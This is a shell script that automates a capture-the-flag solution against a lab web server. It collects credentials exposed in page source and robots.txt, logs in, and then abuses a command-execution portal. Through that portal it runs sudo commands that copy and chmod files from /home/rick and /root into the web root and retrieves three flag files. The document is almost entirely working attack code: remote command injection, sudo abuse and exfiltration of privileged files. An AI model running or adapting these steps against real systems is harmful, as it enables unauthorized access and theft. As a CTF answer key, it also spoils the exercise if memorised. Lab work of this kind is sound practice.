#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.40.105"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "0 - GENERIC SCANNING"
#gobuster dir -u http://$target_ip -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/gobuster-results.txt
#nmap --script vuln -sC -sV -p- -T4 ${target_ip} > $result_folder/nmap-results.txt


echo "1 - RETRIEVE USERNAME"
curl -s -X GET http://$target_ip/ -o $result_folder/index.html
USERNAME=$(cat $result_folder/index.html | sed -n 's/.*Username: \(.*\)/\1/p')
echo "--> Rick username is '$USERNAME'"

echo "2 - RETRIEVE PASSWORD"
curl -s -X GET http://$target_ip/robots.txt -o $result_folder/robots.txt
PASSWORD=$(cat $result_folder/robots.txt)
echo "--> Rick password is '$PASSWORD'"

echo "3 - LOGIN"
curl -s -X GET http://$target_ip/login.php -L -c $result_folder/cookies.txt -o /dev/null 2>/dev/null
curl -s -X POST http://$target_ip/login.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "username=$USERNAME&password=$PASSWORD&sub=Login" -o $result_folder/login.html 

echo "4 - GET THE FIRST INGREDIENT"
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=ls&sub=Execute" -o $result_folder/var-www-html.html
FIRST_INGREDIENT_FILENAME=$(cat $result_folder/var-www-html.html | sed -n 's/.*<\/br><pre>\(.*\)/\1/p')
echo "--> The first ingredent file is '$FIRST_INGREDIENT_FILENAME'"
curl -s -X GET http://$target_ip/$FIRST_INGREDIENT_FILENAME -L -b "$result_folder/cookies.txt" -o $result_folder/$FIRST_INGREDIENT_FILENAME
echo "--> The first ingredent is $(cat $result_folder/$FIRST_INGREDIENT_FILENAME)"

echo "5 - GET THE SECOND INGREDIENT"
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=ls /home/rick&sub=Execute" -o $result_folder/home-rick.html
SECOND_INGREDIENT_FILENAME=$(cat $result_folder/home-rick.html | sed -n 's/.*<\/br><pre>\(.*\)/\1/p')
echo "--> The second ingredent file is '$SECOND_INGREDIENT_FILENAME'"
SECOND_INGREDIENT_FILENAME_URL=$(echo $SECOND_INGREDIENT_FILENAME | sed 's/ /%20/g')
echo "--> The second ingredent file is '$SECOND_INGREDIENT_FILENAME_URL'"
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=sudo cp /home/rick/* /var/www/html/.&sub=Execute" -o /dev/null
curl -s -X GET http://$target_ip/$SECOND_INGREDIENT_FILENAME_URL -L -b "$result_folder/cookies.txt" -o $result_folder/$SECOND_INGREDIENT_FILENAME_URL
echo "--> The second ingredent is $(cat $result_folder/$SECOND_INGREDIENT_FILENAME_URL)"

echo "6 - GET THE THIRD INGREDIENT"
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=sudo ls /root&sub=Execute" -o $result_folder/root.html
THIRD_INGREDIENT_FILENAME=$(cat $result_folder/root.html | sed -n 's/.*<\/br><pre>\(.*\)/\1/p')
echo "--> The third ingredent file is '$THIRD_INGREDIENT_FILENAME'"
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=sudo chmod+777 /root/$THIRD_INGREDIENT_FILENAME&sub=Execute" -o $result_folder/home-rick.html
curl -s -X POST http://$target_ip/portal.php -L -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "command=sudo cp /root/$THIRD_INGREDIENT_FILENAME /var/www/html/.&sub=Execute" -o $result_folder/home-rick.html
curl -s -X GET http://$target_ip/$THIRD_INGREDIENT_FILENAME -L -b "$result_folder/cookies.txt" -o $result_folder/$THIRD_INGREDIENT_FILENAME
echo "--> The third ingredent is $(cat $result_folder/$THIRD_INGREDIENT_FILENAME)"




